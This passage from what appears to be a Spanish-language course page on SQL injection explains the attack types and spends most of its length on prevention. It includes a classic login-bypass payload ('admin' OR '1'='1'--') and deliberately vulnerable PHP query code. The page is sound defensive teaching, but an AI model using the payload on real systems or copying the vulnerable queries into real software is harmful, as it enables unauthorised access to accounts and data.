4. Lleva un registro escrito de los caracteres que encuentras
 
5. Sé paciente: este método es lento pero efectivo
 

 
 

> [!note]
> 
 **⚡ En el mundo real:** Este proceso se automatiza con herramientas como **sqlmap** o scripts en Python que prueban todos los caracteres posibles automáticamente. Sin embargo, es importante entender la técnica manual primero.
> 

 
 

#### Prevención:

 

Usar Prepared Statements previene tanto SQLi tradicional como Blind:
 
// CÓDIGO VULNERABLE:

$sql = "SELECT * FROM users WHERE id = $user_id";

// SOLUCIÓN SEGURA:

$stmt = $conn->prepare("SELECT * FROM users WHERE id =?");

$stmt->bind_param("i", $user_id);

$stmt->execute();

$result = $stmt->get_result();
 
 

Otras medidas:
 

 
* Validar y sanitizar todos los inputs
 
* Usar ORM (Object-Relational Mapping)
 
* Implementar rate limiting para detectar ataques automatizados
 
* WAF (Web Application Firewall) para detectar patrones de SLEEP()
 
* Monitoreo de queries lentas en la base de datos
 

 
 
 

 
 

> [!note]
> 
 
> **🚧 Más laboratorios próximamente...**
> 

 

 
 
 

## 🔍 ¿Cómo Funciona?

 

SQL Injection aprovecha la forma en que las aplicaciones web construyen consultas SQL. Veamos un ejemplo vulnerable:
 
// CÓDIGO VULNERABLE

$username = $_POST['username'];

$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";

$result = mysqli_query($conn, $sql);
 
 

Si un atacante introduce `admin' OR '1'='1'--` como username, la query se convierte en:
 
SELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='...'
 
 

Como `'1'='1'` siempre es verdadero y `--` comenta el resto, el atacante bypasea la autenticación.

 

### Tipos de SQL Injection

 

#### 1. In-band SQLi (Classic)

 

El atacante usa el mismo canal para lanzar el ataque y recibir resultados. Es el tipo más común y fácil de explotar.
 

**Subtipos:**
 

 
* **Error-based:** Fuerza errores SQL para extraer información
 
* **UNION-based:** Usa UNION SELECT para combinar resultados (Lab 2)
 

 

#### 2. Blind SQLi

 

La aplicación no muestra errores SQL ni resultados directos, pero el atacante puede inferir información observando el comportamiento de la aplicación.
 

**Subtipos:**
 

 
* **Boolean-based:** Observa diferencias True/False en respuestas
 
* **Time-based:** Usa SLEEP() para crear delays que confirman condiciones (Lab 3)
 

 

#### 3. Out-of-band SQLi

 

El atacante usa un canal diferente para recibir datos (ej: DNS, HTTP). Menos común y requiere que el servidor tenga ciertas funcionalidades habilitadas.
 

 
 

## 🛡️ Prevención Completa

 

### 1. Prepared Statements (Solución Principal)

 
// PHP con MySQLi

$stmt = $conn->prepare("SELECT * FROM users WHERE id =?");

$stmt->bind_param("i", $id);

$stmt->execute();

// PHP con PDO

$stmt = $pdo->prepare("SELECT * FROM users WHERE id =:id");

$stmt->execute(['id' => $id]);
 

 

### 2. Usar ORM

 
// Laravel Eloquent

$user = User::where('id', $id)->first();

// Django ORM

user = User.objects.get(id=id)
 

 

### 3. Validación de Input

 
// Validar que sea un número

$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);

if ($id === false) {

 die("ID inválido");

}
 

 

### 4. Whitelist de Valores

 
// Para ORDER BY, columnas, etc.

$allowed_columns = ['name', 'price', 'date'];

$order = $_GET['order'];

if (!in_array($order, $allowed_columns)) {

 $order = 'name'; // default

}
 

 

### 5. Principio de Mínimo Privilegio

 

El usuario de base de datos de la aplicación NO debe tener permisos para:
 

 
* DROP TABLE / DROP DATABASE
 
* CREATE TABLE
 
* ALTER TABLE
 
* GRANT / REVOKE
 
* Acceso a otras bases de datos
 

 

### 6. Ocultar Errores en Producción

 
// php.ini en producción

display_errors = Off

log_errors = On

error_log = /var/log/php_errors.log
 

 

### 7. WAF (Web Application Firewall)

 

Implementar reglas que detecten patrones de SQLi:
 

 
* ModSecurity
 
* Cloudflare WAF
 
* AWS WAF
 

 

> [!note]
> 
 **⚠️ Importante:** La prevención de SQL Injection debe ser una combinación de todas estas técnicas. Usar SOLO una no es suficiente. El enfoque de "defensa en profundidad" (defense in depth) es crucial.
> 

 

 
 

**🛡️ VulnWeb Lab** - Laboratorio de Vulnerabilidades Web
 

© 2025 - Entorno Educativo IFCT0109

---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]
